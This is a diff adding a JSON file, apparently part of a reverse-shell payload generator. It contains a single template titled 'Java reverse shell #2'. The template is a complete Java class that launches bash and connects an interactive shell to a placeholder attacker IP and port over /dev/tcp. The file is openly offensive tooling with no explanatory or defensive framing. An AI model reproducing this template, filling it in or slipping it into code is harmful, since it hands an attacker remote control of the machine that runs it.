@@ -1,0 +1,9 @@
+{
+  "commands": [
+    {
+      "title": "Java reverse shell #2",
+      "template": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
+      "description": "Java reverse shell using ProcessBuilder with bash TCP connection."
+    }
+  ]
+}
